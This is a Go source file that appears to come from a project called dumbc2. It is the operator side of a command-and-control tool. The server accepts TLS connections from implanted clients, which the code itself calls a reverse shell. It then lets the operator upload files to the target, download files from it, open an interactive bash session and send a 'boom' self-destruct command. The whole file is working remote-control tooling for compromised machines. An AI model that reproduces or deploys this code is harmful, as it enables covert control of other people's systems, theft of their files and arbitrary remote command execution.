package useri

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/hashicorp/yamux"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/kmahyyg/dumbc2/utils"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

var ymserv *yamux.Session

func StartServer(userOP config.UserOperation) {
	// server mode
	fladdr := userOP.ListenAddr
	lbserver, err := transport.TLSServerBuilder(fladdr, true)
	if err != nil {
		panic(err)
	}
	for true {
		if lbserver != nil {
			log.Println("Listen to Port Successfully, Wait for connection...")
			conn, err := lbserver.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			handleClient(conn)
		} else {
			log.Fatalln("Failed to bind.")
		}
	}
}

func handleClient(conn net.Conn) {
	ymserv = nil
	// start as tls server, means it's a reverse shell
	fmt.Println("Connection established.")
	fmt.Println("Commands: upload, download, boom, bash, exit, help. \n")
	ymconf := yamux.Config{
		AcceptBacklog:          256,
		EnableKeepAlive:        true,
		KeepAliveInterval:      time.Second * 20,
		ConnectionWriteTimeout: time.Minute * 5,
		MaxStreamWindowSize:    256 * 1024,
		LogOutput:              os.Stderr,
	}
	var err error
	ymserv, err = yamux.Server(conn, &ymconf)
	if err != nil {
		log.Fatalln(err)
	}
	cleanup := func() {
		_ = ymserv.Close()
		_ = conn.Close()
	}
	defer cleanup()
	var recvconn net.Conn
	recvconn, err = ymserv.Accept()
	if err != nil {
		log.Fatalln("Mux Error.")
	}
	defer func() {
		_ = recvconn.Close()
	}()
	for true {
		fmt.Printf("[ TARGET %s ] [>_] Controller $ ", conn.RemoteAddr().String())
		useript := utils.ReadUserInput()
		useriptD := strings.Split(useript, " ")
		userCmd, err := remoteop.ParseUserInput(useriptD)
		if fmt.Sprintf("%s", err) == "USER_EXIT" {
			break
		} else if err != nil {
			log.Println(err)
			continue
		} else if userCmd == nil {
			continue
		}
		err = userCommandProcess(userCmd, recvconn)
		if err != nil {
			log.Println(err)
			break
		}
	}
}

func checkRemoteResp(ctrlstem net.Conn) (*remoteop.CmdMsg, error) {
	smbuf := make([]byte, 1300)
	rdint, err := ctrlstem.Read(smbuf)
	if rdint == 0 || err != nil {
		log.Println(err)
		return nil, err
	}
	resp := &remoteop.CmdMsg{}
	err = json.Unmarshal(smbuf[0:rdint], resp)
	if err != nil {
		log.Println(err)
		return resp, err
	}
	if resp.Status > remoteop.StatusFinishTrans {
		err = errors.New(resp.Msg)
		log.Println(err)
		return resp, err
	}
	return resp, nil
}

func userCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
	var curcmdmsg *remoteop.CmdMsg
	switch ucmd.Cmd {
	case remoteop.CommandBOOM:
		curcmdmsg = &remoteop.CmdMsg{
			Status:      remoteop.StatusOK,
			Cmd:         remoteop.CommandBOOM,
			Msg:         "",
			HasNext:     false,
			NextIsBin:   false,
			NextSize:    0,
			NextBinHash: "",
		}
		data, err := json.Marshal(curcmdmsg)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = ctrlstem.Write(data)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = checkRemoteResp(ctrlstem)
		if err != nil {
			log.Println(err)
			return err
		}
		return errors.New("Client BOOM.")
	case remoteop.CommandUPLD:
		data, err := ioutil.ReadFile(ucmd.OptionLCL)
		if err != nil {
			log.Println(err)
			return err
		}
		sha256hex := fmt.Sprintf("%x", sha256.Sum256(data))
		curcmdmsg = &remoteop.CmdMsg{
			Status:      remoteop.StatusOK,
			Cmd:         remoteop.CommandUPLD,
			Msg:         ucmd.OptionRMT,
			NextIsBin:   true,
			HasNext:     true,
			NextSize:    len(data),
			NextBinHash: sha256hex,
		}
		cmddata, err := json.Marshal(curcmdmsg)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = ctrlstem.Write(cmddata)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = checkRemoteResp(ctrlstem)
		if err != nil {
			return err
		}
		datastem, err := ymserv.Accept()
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = datastem.Write(data)
		if err != nil {
			log.Println(err)
			_ = datastem.Close()
			return err
		}
		_, err = checkRemoteResp(ctrlstem)
		if err != nil {
			_ = datastem.Close()
			return err
		}
		_ = datastem.Close()
	case remoteop.CommandDWLD:
		curcmdmsg = &remoteop.CmdMsg{
			Status:      remoteop.StatusOK,
			Cmd:         remoteop.CommandDWLD,
			Msg:         ucmd.OptionRMT,
			NextIsBin:   false,
			HasNext:     false,
			NextSize:    0,
			NextBinHash: "",
		}
		cmddata, err := json.Marshal(curcmdmsg)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = ctrlstem.Write(cmddata)
		if err != nil {
			log.Println(err)
			return err
		}
		rmtfddata, err := checkRemoteResp(ctrlstem)
		if err != nil {
			return err
		}
		if rmtfddata.NextSize == 0 || !rmtfddata.HasNext {
			return errors.New("Unknown internal error.")
		}
		datastem, err := ymserv.Accept()
		if err != nil {
			log.Println(err)
			return err
		}
		var buf bytes.Buffer
		for buf.Len() < rmtfddata.NextSize {
			smbuf := make([]byte, 1300)
			readint, err := datastem.Read(smbuf)
			if err != nil || readint == 0 {
				log.Println(err)
				break
			}
			buf.Write(smbuf[0:readint])
		}
		_ = datastem.Close()
		// create a new empty file to check if writable
		err = ioutil.WriteFile(ucmd.OptionLCL, []byte{0x01}, 0644)
		if err != nil {
			log.Println(err)
			return err
		} else {
			err = os.Remove(ucmd.OptionLCL)
			if err != nil {
				log.Println(err)
				return err
			}
		}
		// write to file and check sha256
		err = ioutil.WriteFile(ucmd.OptionLCL, buf.Bytes()[0:rmtfddata.NextSize], 0644)
		if err != nil {
			log.Println(err)
			return err
		}
		if rmtfddata.NextBinHash != fmt.Sprintf("%x", sha256.Sum256(buf.Bytes()[0:rmtfddata.NextSize])) {
			log.Println("** NOTE: THE DATA TRANSFERED MIGHT CORRUPTED, PLEASE VERIFY. **")
			return nil
		}
	case remoteop.CommandBASH:
		curcmdmsg = &remoteop.CmdMsg{
			Status:      remoteop.StatusOK,
			Cmd:         remoteop.CommandBASH,
			Msg:         "",
			HasNext:     true, // indicates new stream
			NextIsBin:   true, // indicates no json encoding
			NextSize:    -1,   // indicates dynamic content
			NextBinHash: "",
		}
		data, err := json.Marshal(curcmdmsg)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = ctrlstem.Write(data)
		if err != nil {
			log.Println(err)
			return err
		}
		_, err = checkRemoteResp(ctrlstem)
		if err != nil {
			log.Println(err)
			return err
		}
		if ymserv != nil {
			datastem, err := ymserv.Accept()
			if err != nil {
				log.Println(err)
				return err
			}

			copydata := func(r io.Reader, w io.Writer) {
				_, err := io.Copy(w, r)
				if err != nil {
					log.Println(err)
				}
			}
			go copydata(datastem, os.Stdout)
			nscanner := bufio.NewScanner(os.Stdin)
			for nscanner.Scan() {
				iptdt := nscanner.Bytes()
				if bytes.Equal(iptdt, []byte("exit")) {
					iptdt = append(iptdt, []byte("\n")...)
					_, err = datastem.Write(iptdt)
					if err != nil {
						log.Println(err)
						_ = datastem.Close()
						return err
					}
					break
				} else {
					iptdt = append(iptdt, byte('\n'))
					_, err = datastem.Write(iptdt)
					if err != nil {
						_ = datastem.Close()
						log.Println(err)
						return err
					}
				}
			}
			_ = datastem.Close()
			return nil
		}
	default:
		log.Println("Internal Error")
	}
	return nil
}
